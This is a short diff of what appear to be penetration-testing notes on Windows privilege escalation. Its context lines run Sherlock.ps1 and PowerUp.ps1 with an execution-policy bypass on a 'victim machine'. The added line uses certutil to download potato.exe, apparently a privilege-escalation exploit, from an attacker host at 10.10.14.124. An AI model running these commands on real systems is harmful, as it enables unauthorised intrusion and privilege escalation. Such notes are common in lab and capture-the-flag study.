@@ -34,3 +34,8 @@ If you have your ps1 file downloaded to the victim machine then run using this
 c:\>powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"
 ###
 c:\>powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
+
+
+```
+certutil -urlcache -split -f http://10.10.14.124:8000/potato.exe
+```
